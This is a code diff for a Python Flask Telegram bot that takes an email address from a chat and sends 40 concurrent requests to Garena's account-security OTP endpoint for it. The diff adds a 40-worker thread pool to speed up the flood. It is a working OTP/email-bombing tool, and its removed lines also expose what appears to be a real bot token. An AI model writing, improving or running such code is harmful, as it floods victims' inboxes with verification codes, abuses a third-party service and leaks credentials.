@@ -1,11 +1,10 @@
 import requests
-from concurrent.futures import ThreadPoolExecutor
 from flask import Flask, request, jsonify
-import asyncio
+from concurrent.futures import ThreadPoolExecutor
 
 app = Flask(__name__)
 
-BOT_TOKEN = "8658580899:AAGklJayHDFNGVlSRmRr6oC8J6i_YwLRcKA"
+BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
 GARENA_URL = "https://100067.connect.garena.com/game/account_security/swap:send_otp"
 
 headers = {
@@ -14,6 +13,14 @@ headers = {
     'Accept': "application/json",
     'Accept-Encoding': "gzip"
 }
+
+def send_request(email, req_id):
+    try:
+        payload = {'app_id': "100067", 'email': email, 'locale': "ar_MA"}
+        response = requests.post(GARENA_URL, data=payload, headers=headers, timeout=10)
+        return f"[{req_id}] {response.status_code}"
+    except Exception as e:
+        return f"[{req_id}] خطأ"
 
 def send_telegram(chat_id, text):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
@@ -35,32 +42,28 @@ def webhook():
             return jsonify({"status": "ok"}), 200
         
         chat_id = update["message"].get("chat", {}).get("id")
-        text = update["message"].get("text", "").strip()
+        email = update["message"].get("text", "").strip()
         
         if not chat_id:
             return jsonify({"status": "ok"}), 200
         
-        if "@" in text and "." in text:
-            send_telegram(chat_id, f"⏳ جاري ارسال 40 طلب الى {text}...")
+        if "@" in email and "." in email:
+            send_telegram(chat_id, f"جاري ارسال 40 طلب الى {email}...")
             
             results = []
-            payload = {'app_id': "100067", 'email': text, 'locale': "ar_MA"}
-            
-            for i in range(1, 41):
-                try:
-                    response = requests.post(GARENA_URL, data=payload, headers=headers, timeout=5)
-                    results.append(f"[{i}] {response.status_code}")
-                except Exception as e:
-                    results.append(f"[{i}] خطأ")
+            with ThreadPoolExecutor(max_workers=40) as executor:
+                futures = [executor.submit(send_request, email, i) for i in range(1, 41)]
+                results = [f.result() for f in futures]
             
             result_text = "\n".join(results)
-            send_telegram(chat_id, f"✅ النتائج:\n\n{result_text}")
-        elif text == "/start":
-            send_telegram(chat_id, "📧 ارسل الايميل لارسال 40 طلب")
+            send_telegram(chat_id, f"النتائج:\n\n{result_text}")
         
         return jsonify({"status": "ok"}), 200
     except Exception as e:
-        return jsonify({"status": "error"}), 200
+        return jsonify({"status": "ok"}), 200
+
+# Vercel handler
+handler = app
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5000)
